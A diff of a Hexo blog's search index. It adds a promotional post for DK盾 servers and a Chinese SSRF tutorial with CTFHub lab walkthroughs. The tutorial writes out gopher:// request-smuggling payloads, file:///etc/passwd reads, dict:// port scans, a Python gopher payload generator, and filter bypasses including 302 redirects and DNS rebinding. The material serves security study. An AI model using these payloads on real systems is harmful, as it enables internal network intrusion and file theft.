@@ -1,78 +1,166 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>markdown基本语法</title>
-    <url>/posts/47caaf1e.html</url>
-    <content><![CDATA[<h1 id="markdown基本语法说明"><a href="#markdown基本语法说明" class="headerlink" title="markdown基本语法说明"></a>markdown基本语法说明</h1><span id="more"></span>
-
-<h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>在 Markdown 中，你可以通过在文字前面加上 # 来创建标题。# 的数量代表标题的级别。注意，#和标题之间要有一个空格 。例如：</p>
-<p># 一级标题</p>
-<p>## 二级标题</p>
-<p>### 三级标题</p>
-<p>#### 四级标题</p>
-<p>##### 五级标题</p>
-<p>###### 六级标题</p>
-<h2 id="段落和换行"><a href="#段落和换行" class="headerlink" title="段落和换行"></a>段落和换行</h2><p>普通的文本会被转换为段落，段落之间通过一个或多个空白行来分隔。</p>
-<p>如果你想要在不形成新段落的情况下进行换行（即在同一段落中换行），你可以在行尾添加两个或更多的空格然后回车。</p>
-<h2 id="强调"><a href="#强调" class="headerlink" title="强调"></a>强调</h2><p>你可以使用星号 * 或下划线 _ 来强调文本：</p>
-<p>斜体：<br>可以用一个 * 或 _ 包围文本来使其变为斜体。例如：<em>斜体</em> 或 _斜体_。</p>
-<p>粗体：<br>可以用两个 ** 或 __ 包围文本来使其变为粗体。例如：<strong>粗体</strong> 或 __粗体__。</p>
-<p>粗斜体：三个 *** 或 ___ 包围文本。例如：<em><strong>粗斜体</strong></em> 或 ___粗斜体___。</p>
-<h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>Markdown 支持有序列表和无序列表。</p>
-<p>无序列表可以使用星号 *，加号 +，或是减号 - 作为列表标记。</p>
-<ul>
-<li>项目1</li>
-<li>项目2</li>
-<li>项目3</li>
-</ul>
-<p>有序列表直接使用数字接着一个英文句点 .。</p>
-<ol>
-<li>第一项</li>
-<li>第二项</li>
-<li>第三项</li>
-</ol>
-<h2 id="链接和图片"><a href="#链接和图片" class="headerlink" title="链接和图片"></a>链接和图片</h2><p>链接使用 <code>[链接文本](URL)</code> 的格式。例如：<a href="https://cn.bing.com/">Bing</a></p>
-<p>插入图片Markdown语法代码：<code>![图片alt](图片链接 &quot;图片title&quot;)</code> 的格式。<br>例如：<img src="https://pic2.zhimg.com/v2-5fb13110e1de13d4c11e6e7f5b8026da_r.jpg" alt="这是一张图片" title="just a example"></p>
-<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>行内代码使用单个反引号 <code> 包围。例如：</code>代码&#96;。</p>
-<p>代码块使用三个反引号`&#96;&#96;或四个空格缩进。例如：</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line">这是一个代码块</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>你可以使用三个以上的星号 ***、减号 — 或下划线 ___ 来创建一个水平分割线。</p>
-<hr>
-<h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>引用使用 &gt; 符号。例如：</p>
-<blockquote>
-<p>这是一个引用。</p>
-</blockquote>
+    <title>DKdun</title>
+    <url>/posts/2430104760.html</url>
+    <content><![CDATA[<h2 id="高性能服务器解决方案：选择DK盾，选择卓越"><a href="#高性能服务器解决方案：选择DK盾，选择卓越" class="headerlink" title="高性能服务器解决方案：选择DK盾，选择卓越"></a>高性能服务器解决方案：选择DK盾，选择卓越</h2><p>在当今数字化和信息化飞速发展的时代，企业对高性能服务器的需求不断增长。无论是大数据处理、云计算还是企业资源计划（ERP），稳定、高效、安全的服务器都是关键。DK盾致力于为各种规模的企业提供顶级服务器解决方案，以满足您的各类业务需求。</p>
+<h2 id="什么是DK盾？"><a href="#什么是DK盾？" class="headerlink" title="什么是DK盾？"></a>什么是DK盾？</h2><p>DK盾是一家领先的服务器供应商，专注于提供高性能、可靠性突出且安全性极高的服务器设备。我们的产品线涵盖了从入门级到企业级的各种服务器解决方案，适用于不同行业和应用场景。</p>
+<h2 id="主要功能与优势"><a href="#主要功能与优势" class="headerlink" title="主要功能与优势"></a>主要功能与优势</h2><p><strong>高性能硬件配置：</strong>DK盾服务器搭载最新的处理器、超高速内存和先进的存储技术，确保您的应用程序和服务能够快速响应，显著提升工作效率。</p>
+<p><strong>卓越的可靠性：</strong>我们的服务器采用冗余电源、热插拔硬盘和智能管理系统，最大限度地减少宕机时间，确保您的业务持续运转。</p>
+<p><strong>强大的扩展性：</strong>无论是存储扩展还是计算扩展，DK盾服务器都具备灵活的扩展能力，能够轻松应对业务增长带来的挑战。</p>
+<p><strong>严格的安全保障：</strong>DK盾服务器配备了多层次的安全防护机制，包括硬件加密、访问控制和实时监控，全面保障数据安全和隐私。</p>
+<p><strong>绿色节能设计：</strong>我们致力于环保与节能，通过优化服务器能效比，降低能耗和运营成本，同时减少对环境的影响。</p>
+<h2 id="为什么选择DK盾？"><a href="#为什么选择DK盾？" class="headerlink" title="为什么选择DK盾？"></a>为什么选择DK盾？</h2><p>专业的技术支持：DK盾拥有一支经验丰富的技术支持团队，提供7x24小时的技术咨询和故障排除服务，确保您的服务器始终保持最佳状态。</p>
+<p>灵活的解决方案：无论您是中小型企业还是大型企业，我们都能根据您的具体需求提供定制化的服务器解决方案，助您实现业务目标。</p>
+<p>优质的客户体验：从售前咨询到售后服务，DK盾始终以客户为中心，提供全方位的支持和服务，确保每一位客户都能获得满意的体验。</p>
+<p>感兴趣的可以加qq群727077055进行咨询</p>
+<p>111111</p>
 ]]></content>
-      <categories>
-        <category>hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>markdown</tag>
-      </tags>
   </entry>
   <entry>
-    <title>window 2003搭建web服务器</title>
-    <url>/posts/3309922375.html</url>
-    <content><![CDATA[<h2 id="window-server-2003-enterprise-edition下载"><a href="#window-server-2003-enterprise-edition下载" class="headerlink" title="window server 2003 enterprise edition下载"></a>window server 2003 enterprise edition下载</h2><p>百度网盘链接：<a href="https://pan.baidu.com/s/1R3Q-cf9n0t1MqKaF7WBWGA?pwd=5mia">https://pan.baidu.com/s/1R3Q-cf9n0t1MqKaF7WBWGA?pwd=5mia</a><br>提取码：5mia</p>
+    <title>SSRF漏洞</title>
+    <url>/posts/1355767420.html</url>
+    <content><![CDATA[<h1 id="SSRF漏洞定义"><a href="#SSRF漏洞定义" class="headerlink" title="SSRF漏洞定义"></a>SSRF漏洞定义</h1><p>SSRF(<strong>S</strong>erver-<strong>S</strong>ide <strong>R</strong>equest <strong>F</strong>orgery：服务器跨站请求),是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
 <span id="more"></span>
-<h2 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h2><p>1、用vmware创建虚拟机，没什么值得注意的地方，正常安装就行</p>
-<p>2、安装好虚拟机后按步骤来<br><img src="/posts/3309922375/0.png"><br><img src="/posts/3309922375/1.png"><br><img src="/posts/3309922375/2.png"><br><img src="/posts/3309922375/3.png"><br><img src="/posts/3309922375/4.png"><br><img src="/posts/3309922375/5.png"><br><img src="/posts/3309922375/6.png"><br><img src="/posts/3309922375/7.png"><br><img src="/posts/3309922375/8.png"><br><br></p>
-<p>3、创建一个文件夹以放置文件，路径就是文件夹的路径<br><img src="/posts/3309922375/9.png"><br><img src="/posts/3309922375/10.png"><br><img src="/posts/3309922375/11.png"><br><img src="/posts/3309922375/12.png"><br><br></p>
-<p>4、打开test文件夹，创建一个index文本文件，随便输入并保存，记得把最后把后缀名改为html<br><img src="/posts/3309922375/16.png"><br><br></p>
-<p>5、右键test，把权限打开，防止网站无法访问，如果还是无法访问，那么把IIS管理器内web服务扩展里的权限也打开<br><img src="/posts/3309922375/17.png"><br><br></p>
-<p>6、可以看到网站已经可以打开了<br><img src="/posts/3309922375/18.png"><br><br></p>
-<p>7、一般我们使用win2003是为了用源码搭建靶场的，如果有源码在手，我们可以在第三步时就将路径设为源码的文件夹（注意：不是下图这里更改，这里只是作演示）<br><img src="/posts/3309922375/19.png"><br><br></p>
-<p>8、如果在访问网站时需要验证时,可以在用户组里创建一个用户以进行验证并访问网站(我已经验证过了所以没有弹出框可以截出来)<br><img src="/posts/3309922375/13.png"><br><img src="/posts/3309922375/14.png"><br><img src="/posts/3309922375/15.png"></p>
+
+<h2 id="攻击的目标"><a href="#攻击的目标" class="headerlink" title="攻击的目标"></a>攻击的目标</h2><p>从外网无法访问的<strong>内部系统</strong>（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）</p>
+<h2 id="形成的原因"><a href="#形成的原因" class="headerlink" title="形成的原因"></a>形成的原因</h2><p>大多是由于服务端提供了从其他服务器应用<strong>获取数据</strong>的功能，且没有对目标地址做过滤和限制。</p>
+<h2 id="SSRF漏洞危害"><a href="#SSRF漏洞危害" class="headerlink" title="SSRF漏洞危害"></a>SSRF漏洞危害</h2><p>通过服务器A（SSRF服务器）访问A所在内网的其他服务器获取信息，进而利用SSRF实现其他漏洞利用。</p>
+<p>1、利用file协议读取本地文件<br>2、对服务器所在内网、本地进行端口扫描，获取一些服务的banner信息<br>3、攻击运行在内网或本地的应用程序<br>4、对内网web应用进行指纹识别，识别企业内部的资产信息<br>5、攻击内外网的web应用，主要是使用HTTP GET请求就可以实现的攻击  </p>
+<p>SSRF漏洞的利用方式可以分成<strong>两个方向：相关php函数、常利用的相关协议</strong></p>
+<h2 id="相关php函数"><a href="#相关php函数" class="headerlink" title="相关php函数"></a>相关php函数</h2><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">curl_exec</span><span class="params">()</span></span> 用于执行cURL会话，处理复杂的HTTP请求。</span><br><span class="line"><span class="function"><span class="title">fsockopen</span><span class="params">()</span></span> 打开一个网络连接，用于低级别的网络通信</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span> 读取文件或URL内容到字符串，简单高效</span><br><span class="line"><span class="function"><span class="title">fopen</span><span class="params">()</span></span> 打开文件或URL，可以用于读写操作</span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span> 读取文件并直接输出，简单快速</span><br></pre></td></tr></table></figure>
+
+<h2 id="常利用的相关协议"><a href="#常利用的相关协议" class="headerlink" title="常利用的相关协议"></a>常利用的相关协议</h2><figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">// 从文件系统中获取文件内容，如 file:///etc/passwd</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// 常规URL形式</span></span><br><span class="line"><span class="symbol">dict:</span><span class="comment">//字典服务协议，访问字典资源，如 dict:///ip:6767/info:</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">//可用于网络端口扫描</span></span><br><span class="line"><span class="symbol">gopher:</span><span class="comment">//分布式文档传递服务</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>从文件系统中获取文件内容,格式为file:&#x2F;&#x2F;[文件路径]<br>    file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd            读取文件passwd<br>    file:&#x2F;&#x2F;&#x2F;etc&#x2F;hosts               显示当前操作系统网卡的IP<br>    file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;arp           显示arp缓存表(寻找内网其他主机)<br>    file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;fib _trie     显示当前网段路由信息</p>
+<h3 id="http"><a href="#http" class="headerlink" title="http:&#x2F;&#x2F;"></a>http:&#x2F;&#x2F;</h3><p>作用：常规URL形式，允许通过HTTP 1.0的GET方法，以只读访问文件或资源。</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//example.com</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//example.com/file.php?var1 =val1 &amp;var2=val2</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//user:password@example.com</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//example.com</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//example.com/file.php?var1 =val1 &amp;var2=val2</span></span><br><span class="line"><span class="symbol">https:</span><span class="comment">//user:password@example.com</span></span><br></pre></td></tr></table></figure>
+
+<p>协议之间的<strong>区别：</strong><br>    查找内网存活主机IP        file:&#x2F;&#x2F;<br>    查找内网主机开放端口    dict:&#x2F;&#x2F;、ftp:&#x2F;&#x2F;<br>    目录扫描                  http:&#x2F;&#x2F;</p>
+<p>如内网<a href="http://127.0.0.1,通过目录扫描获取网站子页面,使用burp打开代理拦截页面发送至intruder,子页面为http//127.0.0.1/%E6%96%87%E4%BB%B6%E5%90%8D+%E5%90%8E%E7%BC%80%EF%BC%8C%E4%B8%BA%E6%96%87%E4%BB%B6%E5%90%8D%E5%92%8C%E5%90%8E%E7%BC%80%E6%B7%BB%E5%8A%A0payload%E5%8F%98%E9%87%8F%E3%80%82">http://127.0.0.1，通过目录扫描获取网站子页面，使用burp打开代理拦截页面发送至intruder，子页面为http://127.0.0.1/文件名+后缀，为文件名和后缀添加payload变量。</a><br>根据数据包大小判断是否有内容页面。可以增加扫描选项如php、zip、txt等。</p>
+<h3 id="dict"><a href="#dict" class="headerlink" title="dict:&#x2F;&#x2F;"></a>dict:&#x2F;&#x2F;</h3><p>查找内网主机开放端口，获取内网信息，格式为：<code>dict://</code>+<code>ip:端口</code>+<code>/TCP/IP数据</code><br><code>ftp://</code>也可用于网络端口扫描，效率相对较低。</p>
+<p>通过burpsuite抓包，在网址后添加<code>dict://192.168.225.1:80</code><br>在1和80处增加模块，选择集束炸弹，设置payload后进行测试：<br>1、根据Length判断是否返回数据，从而判断端口是否打开<br>2、利用不同的Payload同时扫描多个IP的多个端口</p>
+<h3 id="gopher-（做题可能会出错，很正常，保持耐心）"><a href="#gopher-（做题可能会出错，很正常，保持耐心）" class="headerlink" title="gopher:&#x2F;&#x2F;  （做题可能会出错，很正常，保持耐心）"></a>gopher:&#x2F;&#x2F;  （做题可能会出错，很正常，保持耐心）</h3><p><code>gopher://</code>是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。gopher协议是ssrf利用最广泛的一个协议 。<br><strong>利用范围：</strong>GET提交、POST提交、redis、fastcgi、SQL</p>
+<p><strong>基本格式：</strong><br><code>gopher://&lt;目标IP&gt;：&lt;端口&gt;/&lt;gopher-path&gt;</code><br>注意gopher协议默认端口为 70，web也需要加端口。</p>
+<p>测试一下，在kali的终端里开启nc监听70端口，然后<code>curl  gopher://127.0.0.l/abcd</code>（不输入端口时，gopher协议默认端口70），发现<strong>gopher请求是不转发第一个字符的</strong>。<br><img src="/posts/1355767420/1.png"></p>
+<p>所以，要保证转发的数据正确，就需要自己在<strong>第一位填充</strong>下划线_或者其他字符：<br><img src="/posts/1355767420/2.png"></p>
+<h4 id="gopher伪协议实现GET提交"><a href="#gopher伪协议实现GET提交" class="headerlink" title="gopher伪协议实现GET提交"></a>gopher伪协议实现GET提交</h4><p>需要保留头部信息：<br>1、路径：GET   &#x2F;name.php?name&#x3D;123   HTTP&#x2F;1.1<br>2、目标地址：Host：172.250.250.4<br><code>gopher://172.250.250.4:80/_GET%20/name.php%3fname=123%20HTTP/1.1%0d%0AHost:%20172.250.250.4%0d%0A</code></p>
+<p><font color="red">注意：</font><br>添加端口号80和填充位<br>URL编码：<br>    空格 ：%20<br>    问号 ：%3f<br>    换行符 ： %0d%0A</p>
+<p>1、问号(?)需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0D%0A,但如果直接用工具转，可能只会有%0A<br>3、在HTTP包的最后要加%0D%0A（换行符），代表消息结束(具体可研究HTTP包结束)<br>4、URL编码改为大写,冒号注意英文冒号<br>5、如果使用<strong>BP发包需要进行两次url编码</strong><br>6、GET提交<strong>最后需要增加一个换行符</strong>  </p>
+<h4 id="gopher伪协议实现POST提交"><a href="#gopher伪协议实现POST提交" class="headerlink" title="gopher伪协议实现POST提交"></a>gopher伪协议实现POST提交</h4><p>需要保留头部信息：POST、Host、Content-Type、Content-Length</p>
+<p>将下面保留的内容进行<strong>两次URL编码</strong>：</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /name.php <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span><span class="symbol">:</span><span class="number">172.250</span>.<span class="number">250.4</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span><span class="symbol">:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span><span class="symbol">:</span><span class="number">8</span></span><br><span class="line"> </span><br><span class="line">name=<span class="number">123</span></span><br></pre></td></tr></table></figure>
+
+<p><font color="red">注意：</font><br>1、POST后面是要提交的文件名<br>2、Host为目标主机<br>3、类型要和提交的类型一致<br>4、长度为下面提交内容的具体长度<br>5、中间的空行不能少<br>6、<strong>回车换行要变为%0D%0A</strong>,但如果直接用工具转，可能只会有%0A  </p>
+<p>无论是GET提交还是POST提交，gopher的格式是不变的：<br><code>gopher://172.250.250.4:80/_编码后的内容粘贴至此</code><br><br></p>
+<h4 id="CTFHub技能树："><a href="#CTFHub技能树：" class="headerlink" title="CTFHub技能树："></a>CTFHub技能树：</h4><p>1、输入<code>?url=file:///var/www/html/flag.php</code>得到以下代码</p>
+<figure class="highlight php-template"><table><tr><td class="code"><pre><span class="line"><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">return</span>;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="variable">$flag</span>=<span class="title function_ invoke__">getenv</span>(<span class="string">&quot;CTFHUB&quot;</span>);</span></span><br><span class="line"><span class="language-php"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&quot;key&quot;</span>] == <span class="variable">$key</span>) &#123;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span></span><br><span class="line"><span class="language-php">    <span class="keyword">exit</span>;</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br><span class="line"><span class="language-php"><span class="meta">?&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=</span></span><span class="language-php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$key</span>;<span class="meta">?&gt;</span></span><span class="language-xml"><span class="comment">--&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>2、输入<code>?url=127.0.0.1/flag.php</code><br>回显：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/flag.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;key&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- De<span class="doctag">bug:</span> key=1766811aa32af96837a1e79f776bfbd6--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>发现key的值</p>
+<p>3、那我们可以构造payload为：</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="variable constant_">POST</span> /flag.php <span class="variable constant_">HTTP</span>/<span class="number">1.1</span></span><br><span class="line"><span class="title class_">Host</span><span class="symbol">:</span><span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Type</span><span class="symbol">:application/x-www-form-urlencoded</span></span><br><span class="line"><span class="title class_">Content</span>-<span class="title class_">Length</span><span class="symbol">:</span><span class="number">36</span></span><br><span class="line"></span><br><span class="line">key=1766811aa32af96837a1e79f776bfbd6</span><br></pre></td></tr></table></figure>
+<p>经过一次url编码后：<code>POST%20/flag.php%20HTTP/1.1%0AHost%3A127.0.0.1%0AContent-Type%3Aapplication/x-www-form-urlencoded%0AContent-Length%3A36%0A%0Akey%3D1766811aa32af96837a1e79f776bfbd6</code><br><img src="/posts/1355767420/7.png"><br>注意：需要将<code>%0A</code>替换成<code>%0D%0A</code></p>
+<p>第二次编码后：<code>POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A127.0.0.1%250D%250AContent-Type%253Aapplication/x-www-form-urlencoded%250D%250AContent-Length%253A36%250D%250A%250D%250Akey%253D1766811aa32af96837a1e79f776bfbd6</code></p>
+<p>4、在编码后的payload前加上<code>?url=gopher://127.0.0.1:80/_</code>,在浏览器框内输入<code>?url=gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A127.0.0.1%250D%250AContent-Type%253Aapplication/x-www-form-urlencoded%250D%250AContent-Length%253A36%250D%250A%250D%250Akey%253D1766811aa32af96837a1e79f776bfbd6</code>，即可获得flag<br><img src="/posts/1355767420/8.png"><br><br></p>
+<h1 id="SSRF之绕过"><a href="#SSRF之绕过" class="headerlink" title="SSRF之绕过"></a>SSRF之绕过</h1><h2 id="URL绕过"><a href="#URL绕过" class="headerlink" title="URL绕过"></a>URL绕过</h2><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line">1.利用[::]</span><br><span class="line"><span class="link">http://</span>[<span class="string">::</span>]:80/ =&gt;http://127.0.0.1</span><br><span class="line">不加端口的话是<span class="link">http://</span>[<span class="string">::</span>]/</span><br><span class="line"></span><br><span class="line">2.利用@</span><br><span class="line">这里就是在指定的网址后加@127.0.0.1</span><br><span class="line"></span><br><span class="line">3.利用短域名</span><br><span class="line">http://dwz.cn/11SMa &gt;&gt;&gt; http://127.0.0.1</span><br><span class="line"></span><br><span class="line">4.利用句号</span><br><span class="line">127。0。0。1=&gt;127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<h2 id="环回地址绕过"><a href="#环回地址绕过" class="headerlink" title="环回地址绕过"></a>环回地址绕过</h2><p>在CTF比赛中，有时会限制访问本地网站的内容，当<code>$_SEVER[&#39;REMOTE_ADDR&#39;]==&#39;127.0.0.1&#39;</code>时会报错，但是flag又需要在<code>127.0.0.1</code>才能访问，这时候我们可以对<code>127.0.0.1</code>进行变形绕过。<br><img src="/posts/1355767420/3.png"></p>
+<h2 id="302重定向绕过"><a href="#302重定向绕过" class="headerlink" title="302重定向绕过"></a>302重定向绕过</h2><p>当私网地址被过滤时，可以使用302重定向绕过。（需要一台公网服务器或者将VMware的网卡改成公网的）<br><strong>原理：</strong>当访问公网ip下的一个php文件（含重定向代码）时，php文件会重定向访问代码中的目标地址，实现绕过。</p>
+<p>php代码如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:http://127.0.0.1/flag.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="DNS重绑定绕过"><a href="#DNS重绑定绕过" class="headerlink" title="DNS重绑定绕过"></a>DNS重绑定绕过</h2><p>首先要知道，针对SSRF漏洞的防御一般有以下几个：<br>1.解目标URL，获取其Host<br>2.解析Host，获取Host指向的IP地址<br>3.检查IP地址是否为内网地址<br>4.请求URL<br>5.如果有跳转，拿出跳转URL，重新执行1</p>
+<p>上面的防御可以有效限制:<br>    直接访问内网IP；<br>    302 跳转；<br>    xip.io&#x2F;xip.name；<br>    短链接变换等 URL 变形;<br>    畸形 URL;<br>    iframe 攻击;<br>    IP 进制转换;<br>针对这种防御可以使用DNS Rebinding Attack**(DNS 重绑定攻击)**</p>
+<p>SSRF防御要进行两次DNS解析，第一次DNS解析是对URL的host进行DNS解析<br>第二次DNS解析是使用CURL发包的时候进行解析。我们的突破口就是第二次的DNS解析。<br><img src="/posts/1355767420/4.png"></p>
+<h3 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h3><p>利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。</p>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>1、将第一次DNS解析的IP设为合法IP，绕过host合法性检查。<br>2、将第二次DNS解析的IP设为内网IP，实现SSRF访问内网。<br>这里需要用的网站是：<a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
+<p>例如CTFHUB技能树的DNS重绑定，在上面所说的网站中填写A、B的IP地址，B的随便写就行。<br><img src="/posts/1355767420/5.png"></p>
+<p>将下面生成的DNS复制，构造payload：<code>?url=7f000001.e170d501.rbndr.us/flag.php</code>，GET提交即可得到flag<br><img src="/posts/1355767420/6.png"><br><br></p>
+<h1 id="SSRF漏洞利用"><a href="#SSRF漏洞利用" class="headerlink" title="SSRF漏洞利用"></a>SSRF漏洞利用</h1><h2 id="文件上传利用（ctfhub技能树–上传文件）"><a href="#文件上传利用（ctfhub技能树–上传文件）" class="headerlink" title="文件上传利用（ctfhub技能树–上传文件）"></a>文件上传利用（ctfhub技能树–上传文件）</h2><p><font color="red">格式要求：</font><br><img src="/posts/1355767420/13.png"></p>
+<p>1、打开网站，进入<code>?url=127.0.0.1/flag.php</code>页面，发现文件上传没有提交按钮，于是查看源码在form表单中写一个提交按钮。<br><img src="/posts/1355767420/9.png"></p>
+<p>2、随便新建一个文件，提交时使用burp suite抓包，抓取我们POST提交需要的内容<br><img src="/posts/1355767420/10.png"></p>
+<p>3、修改Host和Content-length即可，脚本如下：</p>
+<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 285</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypE3OJURMLr0Wyw1s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundarypE3OJURMLr0Wyw1s</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.php&quot;</span></span><br><span class="line"><span class="string">Content-Type: application/octet-stream</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;?php?&gt;</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypE3OJURMLr0Wyw1s</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提交</span></span><br><span class="line"><span class="string">------WebKitFormBoundarypE3OJURMLr0Wyw1s--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line"><span class="keyword">new</span> = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="keyword">new</span></span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>
+
